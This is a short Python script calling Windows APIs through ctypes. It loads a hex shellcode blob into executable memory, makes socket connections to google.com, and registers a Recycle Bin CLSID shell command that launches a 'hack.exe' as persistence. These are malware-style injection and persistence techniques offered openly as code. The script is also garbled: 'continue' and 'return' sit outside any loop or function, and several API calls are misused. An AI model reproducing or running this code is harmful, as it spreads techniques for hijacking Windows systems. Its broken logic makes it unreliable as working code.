
import ctypes
import os
import platform
import binascii
data = binascii.unhexlify('b80a000000c3')
GENERIC_ALL = 268435456
CREATE_NEW = 1
FILE_ATTRIBUTE_NORMAL = 128
ctypes.windll.kernel32.Sleep(3000)
file_handle = ctypes.windll.kernel32.CreateFileA('example.txt'.encode('ascii'), GENERIC_ALL, 0, None, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, None)
pid = os.getpid()
hProcess = ctypes.windll.kernel32.OpenProcess(ctypes.c_int(2035711), False, ctypes.c_int(pid))
address = ctypes.windll.kernel32.VirtualAllocEx(hProcess, None, ctypes.c_int(len(data)), ctypes.c_int(4096), ctypes.c_int(64))
ctypes.windll.kernel32.WriteProcessMemory(hProcess, address, data, ctypes.c_int(len(data)), None)
ctypes.windll.kernel32.CloseHandle(hProcess)
winsock = ctypes.windll.Ws2_32
for port in (78, 79, 80):
    s = ctypes.c_int(0)
    s.value = winsock.socket(2, 1, 6)
    target = ctypes.create_string_buffer(b'google.com\x00')
    address = ctypes.create_string_buffer(b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')
    winsock.getaddrinfo(target, None, None, ctypes.byref(address))
    port = ctypes.c_ushort(port)
    result = winsock.connect(s, address, ctypes.sizeof(address), port)
    print('Connected to google.com on port', port)
print('Failed to connect to google.com on port', port)
winsock.closesocket(s)
continue
shell = 'SOFTWARE\\Classes\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\shell'
exe = 'C:\\Users\\IEUser\\Desktop\\research\\2023-01-20-malware-pers-21\\hack.exe'.encode('utf-8')
hkey = ctypes.c_void_p()
res = ctypes.windll.advapi32.RegOpenKeyExW(ctypes.c_uint32(8), shell, 0, 131097, ctypes.byref(hkey))
if res == 0:
    hkR = ctypes.c_void_p()
    res = ctypes.windll.advapi32.RegCreateKeyExW(hkey, 'open\\command', 0, None, 0, 983103, None, ctypes.byref(hkR), None)
    if res == 0:
        res = ctypes.windll.advapi32.RegSetValueExW(hkR, None, 0, 1, exe, len(exe))
        ctypes.windll.advapi32.RegCloseKey(hkR)
    ctypes.windll.advapi32.RegCloseKey(hkey)
    return None
return [ 'Connected to google.com on port' ]
